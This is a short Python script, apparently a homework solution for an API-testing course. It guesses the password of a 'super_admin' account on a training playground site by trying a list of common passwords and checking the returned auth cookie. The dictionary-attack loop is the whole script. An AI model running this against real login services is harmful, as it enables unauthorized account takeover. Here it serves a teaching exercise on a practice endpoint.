import requests

find_pass = "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"
password = ""
for mpass in find_pass:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": mpass})

    cookie_value = response.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})

    #print(f"Response JSON: {response.json()}")
    #print(f"Response Cookies: {cookie_value}")
    #print(f"Response status code: {response.status_code}")
    #print(f"Response text: {response.text}")

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    #print(f"Try authorized with PASSWORD {mpass}. Response: {response2.text}")
    if response2.text == "You are authorized":
        password = mpass

print(f"Your password is: {password}")

